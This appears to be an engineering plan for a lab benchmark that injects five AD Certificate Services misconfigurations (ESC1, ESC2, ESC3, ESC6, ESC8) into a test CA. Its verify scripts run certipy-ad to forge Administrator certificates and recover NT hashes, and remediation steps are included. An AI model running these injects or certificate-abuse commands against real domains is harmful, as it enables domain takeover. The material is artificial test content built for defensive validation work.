# Phase 2 — ADCS ESC chain (S07-S11)

Parent plan: [`2026-04-24-meta4-ad-vm-phase1-4.md`](2026-04-24-meta4-ad-vm-phase1-4.md).

All five scenarios target the Enterprise CA (`corp-ca01`, 10.20.30.6). Inject runs on the CA, not the DC.

## Shared ADCS helpers

Every inject in this phase uses a helper that registers a certificate template in both AD schema (for enrollment) and on the CA (for issuing):

```powershell
# Reusable inline helper — paste into each scenario's inject.ps1.
function Publish-LabTemplate {
    param(
        [string]$TemplateName,        # e.g., "ESC1-SmartCard"
        [string]$DisplayName,         # e.g., "Lab ESC1 Smart Card"
        [hashtable]$Attrs,            # schema attributes hashtable
        [string[]]$EnrollGroups       # e.g., @("Domain Users")
    )
    $configNC = (Get-ADRootDSE).configurationNamingContext
    $tmplPath = "CN=$TemplateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"

    if (-not (Test-ADObject -Identity $tmplPath -ErrorAction SilentlyContinue)) {
        New-ADObject -Name $TemplateName -Path "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC" `
            -Type 'pKICertificateTemplate' -DisplayName $DisplayName -OtherAttributes $Attrs -Server corp-dc01
    } else {
        Set-ADObject -Identity $tmplPath -Replace $Attrs -Server corp-dc01
    }

    # Publish on issuing CA so it's offered to enrollees.
    certutil -SetCAtemplates +$TemplateName | Out-Null

    # Grant enrollment ACL.
    $acl = Get-Acl "AD:$tmplPath"
    foreach ($grp in $EnrollGroups) {
        $sid = (Get-ADGroup -Identity $grp).SID
        $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            [System.Security.Principal.SecurityIdentifier]$sid,
            [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
            [System.Security.AccessControl.AccessControlType]::Allow,
            [Guid]'0e10c968-78fb-11d2-90d4-00c04f79dc55'  # Certificate-Enrollment right
        )
        $acl.AddAccessRule($ace)
    }
    Set-Acl "AD:$tmplPath" -AclObject $acl
}
```

## Shared verify-service.ps1 skeleton

Run against the **CA** (`corp-ca01`). All five ESC scenarios share the same service-health contract: the `CertSvc` service plus `certutil -ping` plus a behavioral legit-enrollment probe (enroll against the built-in `User` template, which stays unchanged):

```powershell
# meta4/ad-vm/scenario-NN/verify-service.ps1
$ErrorActionPreference = 'Stop'
try {
    & certutil -ping | Out-Null
    if ($LASTEXITCODE -ne 0) { throw "certutil -ping exit=$LASTEXITCODE" }

    # Behavioural enrollment against the built-in User template. If the CA
    # is broken, this throws. Discard the resulting cert.
    $tmp = New-Item -ItemType Directory -Force -Path "C:\meta4-setup\svc-probe-NN"
    $req = Join-Path $tmp "req.inf"
    @'
[NewRequest]
Subject="CN=svc-probe-NN"
KeyLength=2048
KeyUsage=0xa0
MachineKeySet=False
RequestType=PKCS10
[RequestAttributes]
CertificateTemplate=User
'@ | Out-File -FilePath $req -Encoding ascii

    $csr = Join-Path $tmp "req.csr"
    $cer = Join-Path $tmp "out.cer"
    & certreq -new -q $req $csr | Out-Null
    & certreq -submit -q -config "corp-ca01.corp.local\corp-ca01-CA" $csr $cer | Out-Null

    if (-not (Test-Path $cer) -or (Get-Item $cer).Length -lt 100) {
        throw "CA did not issue a certificate on behalf of the User template"
    }
    Write-Host "[verify-service-NN] CertSvc + legit User enrollment OK - service HEALTHY"
    exit 0
}
catch {
    Write-Error "[verify-service-NN] $_"
    exit 1
}
```

Substitute `NN` per scenario. Each scenario's threat.md uses this same service contract.

---

## Task 2.1: Scenario 07 — ADCS ESC1 (ENROLLEE_SUPPLIES_SUBJECT)

**Behavioral contract:**
- PoC: attacker runs `certipy-ad req -template 'ESC1-SmartCard' -upn Administrator@corp.local` from alice's credentials; then `certipy-ad auth -pfx administrator.pfx` returns a TGT and NT-hash for Administrator. Exit 0 iff the request is refused (ESC1 closed); exit 1 iff a PFX is produced + auth returns an NT hash.

**Files:** standard five. Harness target `ca` for inject, `ca` for verify-service.

- [ ] **Step 1: harness.json** — id `meta4-adv-07`, inject target `ca`.

- [ ] **Step 2: inject.ps1**

```powershell
# meta4/ad-vm/scenario-07/inject.ps1
# Creates the ESC1-SmartCard template: Client-Auth EKU + ENROLLEE_SUPPLIES_SUBJECT
# flag + enrollment open to Domain Users.

$ErrorActionPreference = 'Stop'
Import-Module ActiveDirectory

# [Paste Publish-LabTemplate helper from PHASE2.md header here]

# ESC1 schema attributes.
$attrs = @{
    'msPKI-Certificate-Name-Flag'   = 1                          # ENROLLEE_SUPPLIES_SUBJECT
    'msPKI-Enrollment-Flag'         = 0
    'msPKI-Private-Key-Flag'        = 0
    'msPKI-Template-Minor-Revision' = 1
    'msPKI-Template-Schema-Version' = 2
    'pKIExtendedKeyUsage'           = @('1.3.6.1.5.5.7.3.2')     # Client Authentication
    'pKIKeyUsage'                   = [byte[]](0x86)              # digitalSignature+keyEncipherment
    'msPKI-RA-Signature'            = 0
    'msPKI-Minimal-Key-Size'        = 2048
    'pKIDefaultKeySpec'             = 1
    'pKIMaxIssuingDepth'            = 0
    'pKIExpirationPeriod'           = [byte[]](0,0x40,0x39,0x87,0x2e,0xe1,0xfe,0xff)
    'pKIOverlapPeriod'              = [byte[]](0,0x80,0xa6,0x0a,0xff,0xde,0xff,0xff)
}
Publish-LabTemplate -TemplateName 'ESC1-SmartCard' -DisplayName 'Lab ESC1 Smart Card' `
    -Attrs $attrs -EnrollGroups @('Domain Users')

Write-Host "[inject-07] ESC1-SmartCard template published with ENROLLEE_SUPPLIES_SUBJECT"
```

- [ ] **Step 3: verify-poc.sh**

```bash
#!/usr/bin/env bash
# meta4/ad-vm/scenario-07/verify-poc.sh
# PASS (exit 0) iff alice cannot coerce an Administrator PFX via ESC1.

set -euo pipefail

cd "$(mktemp -d)"

REQ=$(timeout 60 /usr/bin/certipy-ad req \
    -u 'alice@corp.local' -p 'Password1!' \
    -ca 'corp-ca01-CA' \
    -dc-ip 10.20.30.5 \
    -template 'ESC1-SmartCard' \
    -upn 'administrator@corp.local' 2>&1 || true)

echo "--- certipy req output ---"
echo "$REQ"
echo "--- /certipy req ---"

if [ -f administrator.pfx ]; then
    AUTH=$(timeout 60 /usr/bin/certipy-ad auth \
        -pfx administrator.pfx \
        -dc-ip 10.20.30.5 2>&1 || true)
    echo "--- certipy auth output ---"
    echo "$AUTH"
    if echo "$AUTH" | grep -qE 'NT hash|AS-REP received'; then
        echo "[verify-poc-07] ESC1 still exploitable — PFX + TGT + NT hash recovered" >&2
        exit 1
    fi
fi

if echo "$REQ" | grep -qiE 'template.*not found|access_denied|enrollment.*denied|cannot enroll'; then
    echo "[verify-poc-07] alice denied ESC1 enrollment — PoC BLOCKED"
    exit 0
fi

# If we got here with no pfx and no denial signature, treat as blocked only
# if certipy exited with an error AND no pfx. Otherwise FAIL.
if [ ! -f administrator.pfx ]; then
    echo "[verify-poc-07] no PFX issued — treating as BLOCKED"
    exit 0
fi

echo "[verify-poc-07] unrecognised result — treating as FAIL" >&2
exit 1
```

- [ ] **Step 4: verify-service.ps1** — use the shared skeleton above with `NN=07`.

- [ ] **Step 5: threat.md** — Severity: Critical. CWE-295 (cert validation) / CWE-284. Comp-ctrl: Yes (remove `ENROLLEE_SUPPLIES_SUBJECT` flag or restrict enrollment ACL).

- [ ] **Step 6: smoke** — remediation: `Set-ADObject "CN=ESC1-SmartCard,..." -Replace @{'msPKI-Certificate-Name-Flag'=0}` OR remove Domain Users from enrollment ACL.

- [ ] **Step 7: commit**

---

## Task 2.2: Scenario 08 — ADCS ESC2 (Any Purpose / no EKU)

**Behavioral contract:**
- PoC: attacker enrolls in `ESC2-AnyPurpose`, then uses the resulting cert as a Schannel client against LDAPS 636 to bind as Administrator (via the SAN manipulation that an Any-Purpose cert permits). Exit 0 iff the LDAP bind returns `invalidCredentials` / cert rejected; exit 1 iff bind succeeds as Administrator.

- [ ] **Step 1-7 structure matches Task 2.1** — differences:

**inject.ps1** schema attrs:
```
'msPKI-Certificate-Name-Flag' = 0
'pKIExtendedKeyUsage'         = @()   # NO EKU = Any Purpose
'msPKI-Certificate-Application-Policy' = @('2.5.29.37.0')  # Any Purpose OID
```
Plus ENROLLEE_SUPPLIES_SUBJECT=1 so attacker can set UPN.

**verify-poc.sh** — after `certipy-ad req -template ESC2-AnyPurpose -upn administrator@corp.local`, run `certipy-ad auth -pfx administrator.pfx`. Same PASS/FAIL shape as ESC1.

**Remediation:** add a real Client-Auth EKU or restrict enrollment.

- [ ] **Step 7: commit**

---

## Task 2.3: Scenario 09 — ADCS ESC3 (Enrollment Agent on behalf of)

**Behavioral contract:**
- PoC: attacker (alice) first enrolls in a permissive `ESC3-Agent` template (which contains the `1.3.6.1.4.1.311.20.2.1` certReqEnrollOnBehalfOf EKU), then uses that cert to request an Administrator certificate via `certipy-ad req -on-behalf-of CORP\Administrator`. Exit 0 iff the on-behalf-of issuance is denied; exit 1 iff a valid Administrator PFX is returned.

- [ ] **inject.ps1** creates `ESC3-Agent` + `ESC3-User`:
  - `ESC3-Agent`: EKU = Certificate Request Agent (`1.3.6.1.4.1.311.20.2.1`), enrollable by Domain Users.
  - `ESC3-User`: Client-Auth EKU, issuance requires Certificate Request Agent (`msPKI-RA-Application-Policies` = Certificate Request Agent OID).

- [ ] **verify-poc.sh** uses `certipy-ad req -on-behalf-of`, parses for Administrator PFX.

---

## Task 2.4: Scenario 10 — ADCS ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)

**Behavioral contract:**
- PoC: attacker enrolls in the built-in `User` template but includes `SAN:upn=administrator@corp.local` in the request. CA with EDITF flag accepts the SAN override → attacker gets Administrator cert. Exit 0 iff SAN override is rejected; exit 1 iff Administrator PFX is issued.

- [ ] **inject.ps1**
```powershell
& certutil -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
Restart-Service CertSvc
```
Inject target: CA.

- [ ] **verify-poc.sh** uses `certipy-ad req -template User -upn administrator@corp.local`.

**Remediation:** `certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2 ; Restart-Service CertSvc`.

---

## Task 2.5: Scenario 11 — ADCS ESC8 (Web Enrollment NTLM relay)

**Behavioral contract:**
- PoC requires an NTLM-relay chain: coerce DC authentication via `PetitPotam`, relay to CA's Web Enrollment endpoint, request a DC certificate on its behalf. The probe here uses `certipy-ad relay` in one-shot mode. Exit 0 iff the CA's `/certsrv/` endpoint is either not installed or rejects NTLM auth; exit 1 iff a DC certificate is issued via relay.

- [ ] **inject.ps1** — installs `ADCS-Web-Enrollment` role (which ships disabled on the baseline CA) and enables NTLM over HTTP on the `/certsrv/` vdir:
```powershell
Install-WindowsFeature ADCS-Web-Enrollment -IncludeManagementTools
Install-AdcsWebEnrollment -Force
# Enable NTLM on /certsrv (default is negotiate-only):
Set-WebConfigurationProperty -Filter '/system.webServer/security/authentication/windowsAuthentication' `
    -Location 'Default Web Site/certsrv' -Name 'Enabled' -Value $true
Restart-WebAppPool -Name DefaultAppPool
```

- [ ] **verify-poc.sh** — runs `certipy-ad relay` in one-shot mode + `PetitPotam.py` coercion OR uses `certipy-ad req -web` directly if Web Enrollment responds. Because a full relay chain is flaky, the primary probe is: `curl -s --ntlm -u 'corp\alice:Password1!' http://corp-ca01/certsrv/` — if response contains the Microsoft Active Directory Certificate Services banner, the relay endpoint is live. Couple that with a certipy enrollment attempt for full behavioral cover.

- [ ] **Remediation:** uninstall `ADCS-Web-Enrollment` OR require SSL + EPA on `/certsrv/`.

---

## Task 2.6: Phase 2 smoke

- [ ] Refresh baselines: `./capture-baselines.sh`.
- [ ] For each NN in 07..11: `./run-scenario.sh NN && ./run-scenario.sh NN --verify-only` (FAIL) → remediate → `--verify-only` (PASS).
- [ ] Cross-check with `certipy-ad find -u alice@corp.local -p Password1! -dc-ip 10.20.30.5` — pre-remediation should list all five vulns; post-remediation should list none.
- [ ] Commit: `chore(meta4/ad-vm): Phase 2 smoke — ESC1/2/3/6/8 green`.
